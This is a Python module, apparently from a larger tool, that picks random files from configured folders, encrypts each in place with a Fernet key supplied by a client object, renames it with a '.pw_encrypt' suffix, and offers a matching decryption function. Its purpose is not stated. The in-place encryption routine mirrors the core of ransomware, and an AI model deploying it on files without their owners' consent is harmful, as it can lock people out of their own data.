from . import config
from cryptography.fernet import Fernet
from pathlib import Path
import random
from datetime import datetime

def _get_random_file():
	target_folders = config.get_target_folders()
	target_files = []
	for folder in target_folders:
		folder_path = Path(folder)
		if folder_path.is_dir():
			for file_path in folder_path.rglob("*"):
				if not file_path.is_dir() and file_path.suffix != ".pw_encrypt":
					target_files.append(folder_path.joinpath(file_path))
	if not target_files:
		raise RuntimeError("No unencrypted files found in target folders")
	return random.choice(target_files)

def generate_key():
	return Fernet.generate_key()

def encrypt_random_file(client):
	"""Encrypt a random file in the target folders and return the path encrypted.
	
	Raise RuntimeError if no file was encrypted."""
	fernet = Fernet(client.get_encryption_key())
	path = _get_random_file()
	file_bytes = path.read_bytes()
	encrypted = fernet.encrypt(file_bytes)
	path.write_bytes(encrypted)
	path.replace(path.with_suffix(path.suffix+".pw_encrypt"))
	config.add_to_log(f"[{datetime.now().isoformat()}] Encrypted {str(path)}")
	return str(path)

def decrypt_file(client, path_str):
	"""Decrypt the file at the given path.
	
	Raise FileNotFoundError if the path is invalid, ValueError if the path is not a file, or cryptography.fernet.InvalidToken if the file isn't encrypted or couldn't be decrypted."""
	fernet = Fernet(client.get_encryption_key())
	path = Path(path_str)
	if not path.exists():
		raise FileNotFoundError
	if not path.is_file():
		raise ValueError("Path does not point to a regular file")
	file_bytes = path.read_bytes()
	decrypted = fernet.decrypt(file_bytes)
	path.write_bytes(decrypted)
	path.replace(path.with_suffix(""))
	config.add_to_log(f"[{datetime.now().isoformat()}] Decrypted {str(path)}")
